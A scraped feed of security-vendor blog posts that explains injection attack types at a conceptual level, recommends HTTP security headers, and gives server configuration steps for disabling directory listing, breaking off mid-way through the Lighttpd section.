issues: Exploitable vulnerabilities confirmed with proof-based scanning can be fixed without wasting time on verification.\n- Secure more applications with less effort: Prioritize testing and remediation to first focus on high-risk assets and exploitable issues.\n- Test everything regardless of technology: Tech-agnostic DAST lets you test your websites and applications regardless of tech stack or programming language.\n- Continuously test for vulnerabilities: Integrate DAST both into the SDLC and into production to build a continuous security testing process.\n- Integrate with DevSecOps: Incorporate security into CI/CD pipelines and DevOps workflows.\nKey features to look for in a DAST tool for smaller businesses\nWhen selecting a DAST tool, SMBs should prioritize:\n- Automated proof of exploit: Verifies vulnerabilities to maximize accuracy and cut through false positives\n- Predictive risk scoring: Prioritizes testing based on real-world impact\n- Workflow integrations: Work with the tools your development teams already use\n- API security capabilities: Supports modern API formats and authentication methods\n- DevSecOps compatibility: Fits into CI/CD pipelines and development processes\n- Actionable security issues: Provide clear remediation guidance for developers\nFinal thoughts: Start with DAST for real risk reduction\nWhen selecting a security solution for your websites and applications, ask yourself:\n- Are you prioritizing vulnerabilities based on real risk across your attack surface?\n- Can you validate exploitability or are you drowning in false positives?\n- Are you fixing actual security issues or just reacting to incoming reports?\n- Can the solution cover both your AppSec and InfoSec testing needs?\nA DAST-first approach means finding, validating, and fixing real risks before attackers do. So if you could only start with one tool for your application security program, DAST is the only logical way to go as your fact checker and force multiplier for all other AST tools.\nGet the free AppSec Buyer’s Guide and detailed checklist\nGet the latest content on web security\nin your inbox each week.", "timestamp": "2025-10-21T13:34:33.978835"}
{"source": "blog", "feed": "https://www.acunetix.com/blog/feed/", "title": "Understanding Injection Attacks in Application Security: Types, Tools, and Examples", "url": "https://www.acunetix.com/blog/articles/injection-attacks-application-security/", "published": "Wed, 12 Feb 2025 13:38:01 +0000", "content": "How Injection Attacks Exploit Web Application Vulnerabilities\nInjection attacks occur when malicious input is inserted into a web application, exploiting vulnerabilities in unvalidated user input to execute unintended commands. Attackers craft payloads that manipulate how the application processes data, often leading to unauthorized access, data leaks, or system compromise.\nThis article explores the most prevalent injection attacks targeting web applications and APIs, examines the underlying security weaknesses that enable these exploits, and provides effective detection and prevention strategies to mitigate risks.\nLEARN MORE: How to Prevent SQL Injection\nUnderstanding Injection Attacks\nInjection attacks are a category of cyber threats that exploit injection vulnerabilities, allowing attackers to insert malicious payloads into application code through unvalidated user input. These attacks are among the most severe application security risks, as highlighted in the OWASP Top 10 (2021), where injection vulnerabilities were ranked as the #3 overall security risk for web applications.\nAlthough injection attacks come in various forms, they all share a common trait: attackers manipulate how an application processes data, potentially altering database queries, executing JavaScript, running system commands, or even injecting native application code. Depending on the vulnerability and attack vector, the consequences can range from minor data leaks to severe security breaches, including denial of service (DoS), authentication bypass, privilege escalation, remote code execution (RCE), or full system compromise. Understanding and mitigating these risks is essential for strengthening application security and protecting sensitive data.\nSQL Injection (SQLi): The Most Prevalent Injection Attack\nMany web applications rely on relational databases that use SQL (Structured Query Language) to store and retrieve data. SQL injection (SQLi) is a critical vulnerability that occurs when malicious SQL statements are embedded into user input fields, such as web forms, query parameters, comment sections, or other input channels accessible to users. If an application fails to properly validate or sanitize user input, attackers can manipulate SQL queries to extract sensitive data, alter database records, or even delete entire tables.\nOne of the most common SQLi attack strategies involves injecting an SQL query that grants privileged access, allowing attackers to create, modify, or escalate user permissions within the database. In cases where a vulnerable application does not return data directly, blind SQL injection techniques can be used to infer database information through indirect responses.\nSQL injection vulnerabilities fall under CWE-89: Improper Neutralization of Special Elements Used in an SQL Command and ranked #3 on the CWE Top 25 for 2023, highlighting its severity in application security. Invicti’s DAST tools can automatically detect various forms of SQL injection, including in-band SQL injection (such as UNION-based attacks), blind SQL injection (Boolean-based queries), and out-of-band SQLi techniques, helping organizations identify and remediate SQL vulnerabilities before they can be exploited.\nCross-Site Scripting (XSS): A Critical Script Injection Attack\nAlthough it doesn’t contain “injection” in its name, Cross-Site Scripting (XSS) is fundamentally an injection attack that exploits script execution vulnerabilities. XSS occurs when a web application fails to properly sanitize user-supplied input, allowing malicious JavaScript (or other scripts) to be injected into the application’s output. If a vulnerable application processes this unfiltered input, it may execute the attacker’s script in a victim’s browser, leading to session hijacking, credential theft, or further exploitation.\nTo launch an XSS attack, an attacker embeds a malicious script within a request parameter, form input, or URL query string. Instead of treating the input as standard user data, the application renders and executes the injected script in the user’s browser. While XSS is sometimes considered low-risk, its impact can extend far beyond a single user session, particularly when used as part of a larger attack chain. Furthermore, with the rise of full-stack JavaScript environments like Node.js, XSS vulnerabilities can also pose risks to server-side applications.\nSimple input filtering is not enough to prevent XSS, as attackers can use various techniques to evade filters. To mitigate XSS risks, developers should follow secure coding practices, enforce proper input validation and output encoding, and implement Content Security Policy (CSP) to restrict the execution of unauthorized scripts.\nIn the CWE classification, XSS is identified as CWE-79: Improper Neutralization of Input During Web Page Generation and was ranked #2 in the CWE Top 25 for 2023. Invicti’s DAST tools can automatically detect and validate various types of XSS vulnerabilities, including reflected XSS, stored (persistent) XSS, and DOM-based XSS, helping organizations secure their applications against this widespread threat.\nOS Command Injection: A High-Risk System Exploit\nOS command injection, also known as shell injection, occurs when a web application fails to properly sanitize user input, allowing attackers to execute arbitrary system commands on the underlying server. Some web applications legitimately execute operating system commands—for example, to read or write files, run system utilities, or manage server processes. However, if user-controlled input is improperly handled within these commands, attackers can inject malicious system-level instructions, leading to data exposure, privilege escalation, or full system compromise.\nSuccessful command injection attacks can be highly destructive, enabling attackers to:\n- Retrieve server and system configuration details, helping them map out vulnerabilities.\n- Escalate user privileges, gaining unauthorized administrative access.\n- Execute arbitrary system commands, which can lead to file manipulation, malware deployment, or even complete server takeover.\nHow to Mitigate OS Command Injection\nDue to the severe risks associated with OS command injection, it is best to avoid executing system commands that include user-controllable data whenever possible. If executing system commands is unavoidable, developers should:\n- Strictly validate input to ensure only expected values are processed.\n- Use parameterized execution instead of directly concatenating user input into commands.\n- Restrict command execution to predefined functions that limit potential misuse.\nOS command injection is categorized as CWE-78: Improper Neutralization of Special Elements Used in an OS Command and was ranked #5 in the CWE Top 25 for 2023, highlighting its high-risk nature. Invicti’s DAST tools can detect various command injection vulnerabilities, including blind and out-of-band command injection, helping organizations identify and mitigate these critical security threats before they can be exploited.\nCode Injection (Remote Code Execution – RCE): The Ultimate Security Threat\nCode injection, also known as remote code execution (RCE), is one of the most severe vulnerabilities in web applications. It occurs when an attacker successfully injects malicious application code into user input and gets the vulnerable application to execute it. Unlike OS command injection, which manipulates system commands, code injection directly targets the application’s execution environment, making it an extremely powerful attack.\nHow Code Injection Works\nThe injected code must match the application’s programming language. For example:\n- A PHP-based application with a code injection flaw would be vulnerable to malicious PHP code execution.\n- A Java-based web application could be exploited using Java-based injection payloads.\n- If an application flaw allows both code injection and OS command execution, an attacker could escalate from application-level compromise to full system control.\nWhy RCE is Considered Critical\nRemote Code Execution (RCE) is one of the most dangerous security vulnerabilities because it often results in full system compromise. Attackers with RCE capabilities can:\n- Execute arbitrary code on the server.\n- Modify, delete, or exfiltrate data from the application.\n- Deploy malware or backdoors for persistent access.\n- Escalate privileges and gain administrative control over the system.\nEven though some code injection vulnerabilities require additional steps to exploit, RCE is almost always classified as critical, as it provides attackers with unrestricted access to a compromised system.\nHow to Prevent Code Injection Attacks\n- Never allow user-controlled input to be executed as code—always validate and sanitize input strictly.\n- Use parameterized functions or sandboxed execution environments to restrict the scope of code execution.\n- Apply proper input filtering and encoding to prevent untrusted code from being executed.\nDetection and Classification\nCode injection is classified as CWE-94: Improper Control of Generation of Code and remains one of the most sought-after vulnerabilities in application security testing. Invicti’s vulnerability scanner is capable of detecting and often automatically confirming dozens of code execution and evaluation vulnerabilities across multiple programming languages and frameworks, helping organizations identify and remediate critical security risks before they can be exploited.\nXXE Injection: Exploiting XML Parser Vulnerabilities\nRounding out the top five injection attacks is XML External Entity (XXE) injection, a vulnerability that targets web applications handling XML inputs. If an application supports legacy document type definitions (DTDs) and is configured with weak XML parser security, attackers can manipulate malformed XML documents to execute XXE attacks. These exploits can lead to directory traversal, server-side request forgery (SSRF), or even remote code execution (RCE) in severe cases.\nHow XXE Injection Works\nUnlike other injection attacks that stem from user input validation failures, XXE vulnerabilities arise from insecure XML parser configurations. By injecting external entity references into XML documents, attackers can trick the parser into loading external files, making unauthorized requests, or exposing sensitive system data.\nWhy XXE is Dangerous\n- Can be used for directory traversal, allowing attackers to access restricted files.\n- Enables SSRF attacks, tricking the server into making unintended external requests.\n- In some cases, XXE can lead to remote code execution, allowing complete system compromise.\n- Difficult to detect, as it exploits insecure configurations rather than traditional coding flaws.\nPreventing XXE Attacks\nIf your application processes XML data, the best way to prevent XXE vulnerabilities is to:\n- Disable support for DTDs entirely in your XML parser.\n- If DTDs are required, disallow external entities to prevent unauthorized access.\n- Use secure XML parsers that adhere to modern security best practices.\nXXE Detection and Classification\nXXE vulnerabilities fall under CWE-611: Improper Restriction of XML External Entity Reference. While XXE was ranked #4 in the OWASP Top 10 (2017), it was later merged into the Security Misconfiguration category in the 2021 OWASP Top 10, reflecting its nature as a configuration-based vulnerability.\nInvicti’s web vulnerability scanner can detect and confirm multiple forms of XXE injection, including out-of-band (OOB) XXE attacks, helping organizations secure their XML processing workflows and eliminate risky parser misconfigurations.\nOther Notable Injection Attacks\nWhile the top five injection vulnerabilities pose the most significant risks to web applications and APIs, several less frequent—but still dangerous— injection attacks are also worth noting. These attack types exploit different input channels and target various backend systems, including databases, APIs, template engines, and HTTP headers.\nNoSQL Injection\nSimilar to SQL injection (SQLi), NoSQL injection manipulates database queries—but instead of targeting SQL-based relational databases, it exploits NoSQL databases like MongoDB, Cassandra, or Elasticsearch. Since NoSQL databases do not use a standard query language, injection payloads must be tailored for each database type, often exploiting unvalidated JSON input or JavaScript-based queries to extract or manipulate data.\nJSON Injection\nClosely related to cross-site scripting (XSS), JSON injection allows attackers to manipulate JSON data sent or received by a web application. This is particularly relevant for REST APIs, where JSON is the dominant data format. By injecting or modifying JSON payloads, attackers can alter API behavior, steal sensitive data, or execute unauthorized actions.\nServer-Side Template Injection (SSTI)\nSSTI attacks exploit server-side template engines that dynamically generate HTML or code. If an application improperly handles user input within a template system, attackers can inject malicious expressions, causing the server to execute arbitrary code. Expression language (EL) injection is a related attack, targeting expression parsers within web frameworks instead of template engines, often leading to code execution or unauthorized data access.\nHTTP Header Injection (CRLF Injection)\nHTTP header injection, also known as CRLF (Carriage Return Line Feed) injection, occurs when an application fails to sanitize newline characters (\\r\\n) in user input before inserting it into an HTTP response header. Since HTTP uses newline characters to separate headers from the body, an attacker can inject their own headers or modify the response, potentially replacing the page content with a malicious XSS payload or altering security policies.\nFinal Thoughts\nWhile these injection attacks are less common than SQL injection, XSS, OS command injection, code injection, and XXE, they still pose serious risks when applications fail to validate and sanitize user input properly. Modern security best practices, including input validation, output encoding, parameterized queries, and strict API security controls, are essential for mitigating these threats.\nOrganizations should adopt automated security testing solutions, such as Invicti’s DAST scanner, to detect and remediate injection vulnerabilities before they can be exploited.\nGet the latest content on web security\nin your inbox each week.", "timestamp": "2025-10-21T13:34:34.709433"}
{"source": "blog", "feed": "https://www.acunetix.com/blog/feed/", "title": "Strengthen Your Web Applications with HTTP Security Headers", "url": "https://www.acunetix.com/blog/articles/http-security-headers-web-applications/", "published": "Wed, 12 Feb 2025 13:35:30 +0000", "content": "What is a HTTP security header?\nAn HTTP security header is a response header that helps protect web applications by providing browsers with specific instructions on how to handle website content securely. These headers play a crucial role in mitigating various cyber threats, such as cross-site scripting (XSS), clickjacking, and data injection attacks. By configuring HTTP security headers correctly, organizations can enforce stricter security policies, restrict unauthorized resource loading, and reduce the risk of malicious exploitation. Common HTTP security headers include Content Security Policy (CSP) to prevent injection attacks, Strict-Transport-Security (HSTS) to enforce secure HTTPS connections, and X-Frame-Options to prevent clickjacking. Implementing these headers is a fundamental and effective way to enhance web application security, providing an additional layer of defense against cyber threats.\nEnhancing Your Web Application’s Security with HTTP Security Headers\nIn web application security testing, vulnerabilities are typically seen as exploitable weaknesses within the application’s code that must be addressed at the source. This often results in fixing a single flaw within a specific application, usually confined to one area of the code.\nHowever, HTTP security headers function at the runtime level, offering a broader and more dynamic layer of protection. By defining strict rules for browser and server interactions once the application is live, these headers help prevent entire categories of cyber threats, making them a highly effective security measure. Properly configuring and implementing these headers is a key component of a strong security posture. The challenge lies in selecting the most impactful headers and ensuring they are consistently applied and tested across your application environment to maintain both security and functionality.\nMaintaining the effectiveness of your HTTP security headers through dynamic application security testing (DAST).\nLike many other web technologies, HTTP protocol headers evolve over time, influenced by changing specifications and browser vendor support. Security research often advances faster than official standards, leading to the rise and fall of de facto security practices independent of formal specifications. Headers that were once widely adopted may become obsolete, replaced by newer, more effective alternatives—making it challenging to stay up to date.\nAdditionally, security headers can be configured at both the server level and within the application itself. In complex environments with hundreds of servers powering thousands of websites, applications, and APIs, manually managing and auditing security headers across all touchpoints is impractical. This is where automated vulnerability scanners come into play. Advanced tools, such as Invicti’s DAST solutions, can automatically detect the presence and proper configuration of HTTP security headers, offering clear recommendations based on the latest security best practices.\nEssential HTTP Security Headers\nTo start, let’s look at two of the most widely recognized HTTP response headers that every modern web application should implement. Beyond significantly reducing the risk of entire categories of web-based attacks, these headers have become a fundamental necessity for maintaining a secure online presence.\nStrict-Transport-Security (HSTS)\nThe HTTP Strict Transport Security (HSTS) header is a crucial security measure that ensures web applications only use encrypted HTTPS connections, preventing unencrypted HTTP communication. Configured at the server level, HSTS helps protect against man-in-the-middle (MITM) attacks and protocol downgrade attempts.\nA typical HSTS header might look like this:\nStrict-Transport-Security: max-age=63072000; includeSubDomains; preload\nThis directive tells web browsers that the site, along with all its subdomains, must only be accessed over HTTPS for the next two years (as specified by the max-age value in seconds). The preload directive signifies that the site is included in a global list of HTTPS-only domains, further enhancing security by eliminating the risk of an initial unencrypted connection. Additionally, preloading improves performance by ensuring browsers never attempt to connect via HTTP, even on a first visit.\nContent Security Policy (CSP)\nThe Content Security Policy (CSP) header is one of the most versatile and powerful HTTP security headers, providing granular control over the sources from which a web application can load content. By defining strict rules for permitted content sources—including scripts, styles, images, and other resources—CSP serves as an effective defense against cross-site scripting (XSS) attacks and other code injection threats.\nA basic CSP header that restricts all resources to the same origin looks like this:\nContent-Security-Policy: default-src ‘self’\nBeyond this default setting, CSP allows more specific directives, such as script-src, style-src, object-src, and img-src, to define trusted sources for JavaScript, CSS, embedded objects, and images, respectively. For instance, setting script-src ‘self’ ensures that only scripts hosted on the same origin can execute, while still permitting other resources to be loaded externally. Properly implementing CSP significantly reduces the risk of unauthorized script execution and strengthens a web application’s overall security posture.\nAdditional HTTP Security Headers\nWhile Content Security Policy (CSP) and Strict-Transport-Security (HSTS) are among the most essential security headers, several other HTTP headers can further enhance your web application’s defenses with minimal effort. Although they may not be as critical, these headers provide valuable protection against various web-based threats, often achieving security enhancements that would be much more complex to implement solely through application code.\nX-Content-Type-Options\nThe X-Content-Type-Options header enhances security by preventing web browsers from “sniffing” MIME types and incorrectly interpreting files as executable scripts. When included in server responses, this header ensures that browsers strictly adhere to the MIME types declared in the Content-Type header, reducing the risk of attacks that exploit MIME sniffing to execute malicious code.\nTo enforce this protection, the header uses a single directive:\nX-Content-Type-Options: nosniff\nBy implementing this header, websites can mitigate the risk of certain cross-site scripting (XSS) and drive-by download attacks, ensuring that content is processed only as intended by the server.\nCross-Origin Resource Sharing (CORS) Headers\nModern web applications often need to interact with external resources beyond their own domain, requiring controlled exceptions to the same-origin policy (SOP) enforced by browsers. Several HTTP headers allow developers to selectively relax these restrictions while maintaining strong security measures.\n- Access-Control-Allow-Origin: Defines which domains are permitted to access resources across origins. The value can be a specific domain, multiple domains, or * to allow all origins (though using * should be done cautiously).\n- Cross-Origin-Opener-Policy (COOP): Determines whether a top-level document can share its browsing context with cross-origin pages. Setting it to same-origin prevents unauthorized cross-origin access.\n- Cross-Origin-Resource-Policy (CORP): Specifies which domains can load a particular resource. Using same-site restricts access to the same origin, preventing external sites from including the resource.\n- Cross-Origin-Embedder-Policy (COEP): Similar to CORP but specifically governs embedded content. The require-corp directive ensures that only resources from permitted origins, as defined by the CORP header, can be embedded.\nSince security headers often overlap in functionality, multiple configurations may be required to achieve the desired security posture while maintaining necessary cross-origin functionality. Properly implementing CORS headers ensures a balance between security and interoperability for web applications interacting with third-party resources.\nFetch Metadata Headers\nFetch metadata headers are a newer set of client-side HTTP headers that provide additional context about how a request was initiated, allowing servers to enforce stricter security policies. These headers help browsers communicate application-specific request attributes to the server, improving protection against cross-site request forgery (CSRF), cross-origin attacks, and speculative execution threats.\nThe four key fetch metadata headers include:\n- Sec-Fetch-Site: Indicates the relationship between the request’s initiator and the target origin (e.g., same-origin, cross-site, same-site).\n- Sec-Fetch-Mode: Specifies the request mode, such as cors, navigate, or no-cors, helping the server determine how the request was made.\n- Sec-Fetch-User: Identifies whether the request was triggered by a user interaction, such as clicking a link.\n- Sec-Fetch-Dest: Defines the intended request destination, such as document, image, script, or style.\nWhen both the browser and server support these headers, they offer an additional layer of security by enabling the server to validate request behavior and block potentially malicious activity. Properly configured, fetch metadata headers enhance web application security by allowing finer control over how resources are accessed and used.\nAdditional HTTP Headers for Privacy and Security\nWhile not strictly classified as security headers, certain HTTP headers play a crucial role in enhancing data privacy and security by controlling how information is shared between web pages and servers. One such header is Referrer-Policy, which helps regulate how much referrer information is exposed during HTTP requests.\nReferrer-Policy\nThis header determines how much of the referring URL a browser should include when making requests to another web server. A commonly used directive is:\nReferrer-Policy: origin-when-cross-origin\nWith this setting, the browser sends the full referrer URL when navigating within the same origin but limits it to just the origin (domain) when making cross-origin requests. This approach helps protect user privacy by preventing external sites from accessing full browsing paths while still allowing useful referrer data within the same site.\nBy implementing Referrer-Policy, websites can strike a balance between maintaining analytics functionality and reducing the risk of leaking sensitive URL parameters to external domains.\nCache-Control: Managing Web Page Caching\nThe Cache-Control header provides fine-grained control over how web pages and resources are cached by browsers and intermediary servers. Properly configuring this header is essential for performance optimization and data security, ensuring that sensitive information is not inadvertently stored or retrieved from cache.\nA commonly used directive for preventing caching is:\nCache-Control: no-store\nThis setting ensures that the response is never stored in any cache, which is particularly useful for pages handling confidential data such as login sessions, financial transactions, or personal information.\nOther Cache-Control directives allow further customization, such as setting expiration times (max-age), requiring revalidation (must-revalidate), or specifying caching behavior for private versus shared caches. By leveraging Cache-Control, websites can enhance security while optimizing content delivery based on their specific needs.\nClear-Site-Data: Ensuring User Privacy After Logout\nThe Clear-Site-Data header helps enhance security and privacy by instructing the browser to clear specific types of stored data when a user logs out or when a session ends. This prevents confidential information from lingering in the browser, reducing the risk of unauthorized access.\nA common implementation that clears all stored site data is:\nClear-Site-Data: “*”\nThis directive wipes all cached content, cookies, and stored session data associated with the site. Alternatively, more specific directives such as cache, cookies, and storage allow finer control over which types of data are removed.\nWhile not yet universally supported across all browsers, Clear-Site-Data is a valuable tool for reinforcing user privacy, especially in applications handling sensitive information like financial services, healthcare, or authentication-based platforms.\nPermissions-Policy: Controlling Access to Browser Features\nFormerly known as Feature-Policy, the Permissions-Policy header enables developers to restrict or allow access to various browser features and APIs for a web page. While it can be used to control application functionality, its primary purpose is to enhance privacy and security by limiting access to sensitive resources such as the microphone, camera, and geolocation.\nTo block all three of these features, you can use:\nPermissions-Policy: microphone=(), camera=(), geolocation=()\nThis configuration explicitly disables access to the microphone, camera, and geolocation APIs, preventing unauthorized use by scripts or embedded content. Additional directives allow for more granular control, such as restricting access to specific domains or allowing features only in certain contexts.\nBy implementing Permissions-Policy, websites can reduce the attack surface, mitigate privacy risks, and ensure that only necessary features are available to users.\nDeprecated HTTP Security Headers: A Look at the Past\nIn the early days of web security, dominant browsers frequently introduced new HTTP headers as temporary fixes for emerging threats. However, as web security standards evolved and became more structured, many of these headers were deprecated—sometimes within just a few years. While they are no longer recommended for modern applications, these deprecated headers offer valuable insight into the rapid evolution of web security technologies.\n(Deprecated) X-Frame-Options\nOriginally introduced in 2008 by Microsoft Internet Explorer, the X-Frame-Options header was designed to prevent cross-site scripting (XSS) attacks involving HTML iframes. Before the introduction of more standardized security mechanisms, this header provided a way to control whether a web page could be embedded within an iframe, helping mitigate clickjacking attacks.\nTo block iframe embedding entirely, a site could use:\nX-Frame-Options: deny\nAlternatively, setting it to sameorigin allowed the page to be loaded in an iframe only if the parent frame was from the same origin:\nX-Frame-Options: sameorigin\nThere was also an allow-from directive, which permitted specific trusted URLs to embed the page. However, this header was eventually deprecated in favor of the frame-ancestors directive within the Content Security Policy (CSP) standard, which provides more granular and flexible control over iframe embedding.\nWhile deprecated, X-Frame-Options played a crucial role in the development of modern web security practices, demonstrating how quickly security strategies must adapt to evolving threats.\nDeprecated HTTP Security Headers: Lessons from the Past\nOver the years, various HTTP security headers have been introduced as temporary fixes for evolving security threats. However, as web security standards improved and better solutions emerged, many of these headers became obsolete. Below are three notable security headers that have since been deprecated and replaced with more effective alternatives.\n(Deprecated) X-XSS-Protection\nThe X-XSS-Protection header was originally designed to mitigate cross-site scripting (XSS) attacks by leveraging built-in XSS filters in web browsers. A typical implementation looked like this:\nX-XSS-Protection: 1; mode=block\nThis setting instructed the browser to detect and block suspected JavaScript injection attacks. However, due to advancements in Content Security Policy (CSP) and the increasing ability of attackers to bypass XSS filters, modern browsers have removed support for this header. Today, CSP directives serve as the primary defense against XSS attacks, rendering X-XSS-Protection obsolete.\n(Deprecated) Public-Key-Pins (HPKP)\nHTTP Public Key Pinning (HPKP) was introduced to prevent certificate spoofing by allowing websites to specify which cryptographic keys should be trusted in future HTTPS connections. The server would provide a hash of valid certificate public keys, as seen in this example:\nPublic-Key-Pins: pin-sha256=”cUPcTAZWKaASuYWhhneDttWpY3oBAkE3h2+soZS7sWs=”; max-age=5184000\nWhile HPKP aimed to strengthen security, it proved overly complex and risky—a misconfiguration could lock users out of a website for extended periods (e.g., two months, as defined by max-age). Due to these challenges, HPKP was deprecated in favor of Certificate Transparency (CT) logs and the Expect-CT header—though that solution didn’t last either.\n(Deprecated) Expect-CT\nFollowing the deprecation of HPKP, the Expect-CT header was introduced as a way to enforce Certificate Transparency (CT) compliance. This header instructed browsers to only accept certificates that were logged in public CT records, preventing certificate spoofing. A typical configuration looked like this:\nExpect-CT: max-age=86400, enforce, report-uri=”https://example.com/report”\nThe enforce directive blocked non-compliant certificates, while report-uri allowed failures to be logged for further analysis. However, the industry eventually moved away from Expect-CT, and Mozilla now recommends disabling it entirely. Modern browsers now rely on automatic enforcement of Certificate Transparency without requiring a dedicated security header.\nThe Takeaway\nWhile X-XSS-Protection, HPKP, and Expect-CT were once seen as valuable security measures, they ultimately proved ineffective or were replaced by more robust alternatives like CSP and Certificate Transparency logs. These deprecations highlight the constant evolution of web security, emphasizing the importance of staying updated with modern security best practices.\nStay on Top of HTTP Security Headers with Invicti\nImplementing HTTP security headers is one of the simplest yet most effective ways to strengthen web application security, often requiring little to no changes to the application itself. However, keeping up with evolving security best practices and browser support changes can be challenging—especially when managing a large number of websites.\nTo help organizations maintain strong security postures, Invicti offers automated vulnerability scanning that includes thorough checks for HTTP security headers and other misconfigurations. Invicti not only detects the presence of security headers but also verifies their correct implementation, providing clear recommendations to ensure your web applications remain fully protected against emerging threats. By integrating Invicti’s security testing, businesses can effortlessly stay up to date and maintain a robust security framework.\nGet the latest content on web security\nin your inbox each week.", "timestamp": "2025-10-21T13:34:35.310725"}
{"source": "blog", "feed": "https://www.acunetix.com/blog/feed/", "title": "Disabling Directory Listing on Your Web Server – And Why It Matters", "url": "https://www.acunetix.com/blog/articles/disabling-directory-listing-web-server/", "published": "Wed, 12 Feb 2025 13:33:20 +0000", "content": "By default, some web servers allow directory listing, which means that if no default index file (such as index.html or index.php) is present, the server will display a list of all files and directories in that folder. This can expose sensitive files, scripts, and configurations, making it easier for attackers to identify vulnerabilities.\nUnderstanding Directory Listing\nDirectory listing is a web server feature that, when enabled, displays the contents of a directory if no default index file (such as index.html or index.php) is present. When a request is made to such a directory, the server automatically generates and returns a list of all files and subdirectories within it. This can pose a security risk by exposing sensitive files related to a web application, potentially revealing critical information.\nIf attackers gain access to directory listings, they can analyze file structures, discover hidden scripts, or identify outdated components—information that could be used to launch targeted attacks, including cross-site scripting (XSS) and other exploits. To prevent information leakage, it is crucial to disable directory listing and restrict unnecessary access to server files.\nWhy You Should Disable Directory Listing\nLeaving directory listing enabled can expose critical information, such as hidden scripts, backups, or configuration files, which could be used in cyberattacks. Disabling it adds an extra layer of security, ensuring that unauthorized users cannot easily browse and analyze your server’s structure.\nWhat Information Can Be Exposed Through Directory Listing – And Why It’s a Risk\nWhen directory listing is enabled, unauthorized users can gain access to sensitive files that should remain hidden. For example, if a backup copy of a configuration file (such as config.php) is stored in a directory where listing hasn’t been disabled, an attacker could discover and access it simply by navigating to:\nhttp://www.example.com/secret/\nIf this file contains database credentials, API keys, or other confidential details, an attacker can extract this information, gaining unauthorized access to the database. This could lead to data breaches, unauthorized modifications, further exploits, or even complete application compromise.\nBeyond direct data theft, exposed directories may also reveal outdated scripts, log files, or debugging information that can be leveraged for cross-site scripting (XSS), SQL injection, or remote code execution (RCE) attacks.\nHow to Mitigate This Risk\nTo prevent information leakage, it’s essential to:\n- Disable directory listing on your web server.\n- Restrict access to sensitive directories using proper file permissions.\n- Avoid storing backup or configuration files in publicly accessible locations.\nBy taking these precautions, you can significantly reduce the attack surface and protect critical data from unauthorized access.\nHow to Disable Directory Listing\nTo prevent unauthorized access to your file structure, you can disable directory listing based on your web server:\n- Apache: Modify the .htaccess file or main configuration file by adding:\nOptions -Indexes\n- Nginx: In the server configuration file, set:\nautoindex off;\n- IIS (Windows Server): Disable directory browsing through the IIS Manager by navigating to Features View > Directory Browsing and selecting Disable.\nHow to Disable Directory Listing on Tomcat\nIn Apache Tomcat, directory listing is disabled by default starting from version 5.0. However, if it has been re-enabled due to configuration changes or regressions, it’s important to manually disable it to prevent unauthorized access to directory contents.\nTomcat allows you to configure directory listing at two levels:\n- Globally – Applies to all web applications running on the server.\n- Per Application – Disables directory listing for a specific website only.\nDisabling Directory Listing for All Tomcat Web Applications\nTo disable directory listing across all Tomcat-hosted applications:\n- Locate the web.xml configuration file in the Tomcat installation directory. On Windows 10, this is typically:\nC:\\Program Files (x86)\\Apache Software Foundation\\Tomcat 9.0\\conf\\web.xml\n- Open the web.xml file in a text editor.\n- Find the following section related to directory listings under the default servlet configuration:\n<init-param>\n<param-name>listings</param-name>\n<param-value>true</param-value>\n</init-param>\n- Change true to false to disable directory listing:\n<init-param>\n<param-name>listings</param-name>\n<param-value>false</param-value>\n</init-param>\n- Save the file and restart Tomcat for the changes to take effect.\nBy applying this setting, directory listings will be disabled for all web applications running on the Tomcat server, reducing the risk of information exposure and unauthorized access.\nDisabling Directory Listing for a Specific Tomcat Web Application\nIf you need to disable directory listing for a single web application rather than for all projects on the Tomcat server, you can configure this setting at the application level by modifying the web.xml file specific to that project.\nSteps to Disable Directory Listing for a Specific Web Project\n1. Locate the web.xml file for the web application you want to configure. This file is typically found in:\n<TOMCAT_HOME>/webapps/<your_project>/WEB-INF/web.xml\n2. Open the web.xml file in a text editor.\n3. Add the following servlet configuration to explicitly disable directory listing for this specific project:\n<servlet>\n<servlet-name>default</servlet-name>\n<servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>\n<init-param>\n<param-name>listings</param-name>\n<param-value>false</param-value>\n</init-param>\n</servlet>\n4. Save the file and restart Tomcat for the changes to take effect.\nBy implementing this configuration, directory listing will be disabled only for the specified web application, ensuring that other projects running on the same Tomcat server remain unaffected.\nDisabling Directory Listing on Nginx\nIn Nginx, directory listing is managed by the ngx_http_index_module, with the autoindex directive controlling whether files in a directory are displayed when no index file (such as index.html) is present. By default, directory listing is disabled, but if it has been re-enabled due to configuration changes or a regression, you can manually disable it.\nLocating the Nginx Configuration File\nThe primary configuration file for an Nginx server is typically named nginx.conf and is commonly found in one of the following locations:\n- /usr/local/nginx/conf/nginx.conf\n- /etc/nginx/nginx.conf\n- /usr/local/etc/nginx/nginx.conf\nDisabling Directory Listing in Nginx\nIf directory listing has been enabled, you will see a configuration similar to:\nlocation\n/\n{\nautoindex\non;\n}\nTo disable directory listing, modify the autoindex setting as follows:\nlocation\n/\n{\nautoindex\noff;\n}\nAfter making this change, save the configuration file and restart Nginx to apply the update:\nsudo systemctl restart nginx\nBy setting autoindex off, Nginx will no longer display directory listings, ensuring that unauthorized users cannot browse file structures and potentially access sensitive data.\nDisabling Directory Listing on LiteSpeed\nLike other web servers, LiteSpeed allows you to disable directory listing at both the server level and individual website level. This ensures that unauthorized users cannot browse directories without an index file, reducing the risk of exposing sensitive information.\nDisabling Directory Listing at the Server Level\nTo disable directory listing for all websites on the LiteSpeed server, you can manually edit the configuration file or use the LiteSpeed WebAdmin Console.\nMethod 1: Editing the Configuration File\n- Locate and open the httpd_config.xml file. The exact location depends on your installation, but it is commonly found in:\n/usr/local/lsws/conf/httpd_config.xml\n- Find the <autoIndex> setting under the <serverConfig> section. If directory listing is enabled, you’ll see:\n<autoIndex>1</autoIndex>\n- Change the value from 1 to 0 to disable directory listing:\n<autoIndex>0</autoIndex>\n- Save the file and restart the LiteSpeed server for the changes to take effect:\nsudo systemctl restart lsws\nMethod 2: Using the LiteSpeed WebAdmin Console\n- Log in to the LiteSpeed WebAdmin Console.\n- Navigate to Configuration > Server > General.\n- Locate the Auto Index setting.\n- Change the value to Off.\n- Save the settings and restart LiteSpeed.\nBy applying this change, directory listing will be disabled across all websites hosted on the LiteSpeed server, preventing unintended exposure of files and directories.\nDisabling Directory Listing on Lighttpd\nIn Lighttpd, directory listing is disabled by default, but if it has been enabled due to configuration changes or a regression, you can manually turn it off by modifying the dirlisting.conf file. This file controls settings for the mod_dirlisting module, which is responsible for generating directory listings.\nLocating and Editing the Directory Listing Configuration\n1. Open the dirlisting.conf file, typically found 